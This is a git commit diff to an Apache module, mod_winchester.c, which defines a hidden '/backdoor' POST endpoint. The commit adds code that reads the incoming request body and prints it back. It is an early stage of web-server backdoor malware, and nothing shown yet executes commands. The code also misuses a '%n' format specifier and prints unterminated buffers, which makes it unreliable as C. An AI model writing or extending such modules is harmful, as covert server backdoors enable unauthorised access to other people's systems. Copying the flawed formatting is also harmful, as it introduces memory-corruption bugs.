658ae4467ac3865565bd20e8655a619496056fe8
Milkshak3s <justchris.vantine@gmail.com>
2018-01-17 16:52:15 -0500

    Prints post body

--- mod_winchester.c
+++ mod_winchester.c
@@ -20,6 +20,7 @@ static int winchester_handler(request_rec *r)
     }
     if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST) {
         apr_bucket_brigade *bb_in;
+        apr_bucket *bucket;
         apr_status_t rc;
 
         // create bucket brigade to store body
@@ -29,11 +30,29 @@ static int winchester_handler(request_rec *r)
         // get request body from filters, store in bucket
         rc = ap_get_brigade(r->input_filters, bb_in, AP_MODE_READBYTES, APR_BLOCK_READ, HUGE_STRING_LEN);
         ap_rprintf(r, "Got brigade from filters\n");
-
         // check error code on last op
         if (rc != APR_SUCCESS) {
             ap_rprintf(r, "Error code %n on attempt\n", rc);
+            return DONE;
         }
+
+        // read from new brigade
+        for (bucket = APR_BRIGADE_FIRST(bb_in);
+             bucket != APR_BRIGADE_SENTINEL(bb_in);
+             bucket = APR_BUCKET_NEXT(bucket))
+        {
+            const char *buf;
+            apr_size_t buflen;
+            
+            rc = apr_bucket_read(bucket, &buf, &buflen, APR_BLOCK_READ);
+            if (rc != APR_SUCCESS) {
+                ap_rprintf(r, "Error code %n on attempt\n", rc);
+                return DONE;
+            }
+            ap_rprintf(r, "\tBuffer: %s\n", buf);
+        }
+        ap_rprintf(r, "Read brigade into buffer\n");
+
         ap_rprintf(r, "Operation successful!\n");
 
         ap_rprintf(r, "Backdoor POST");
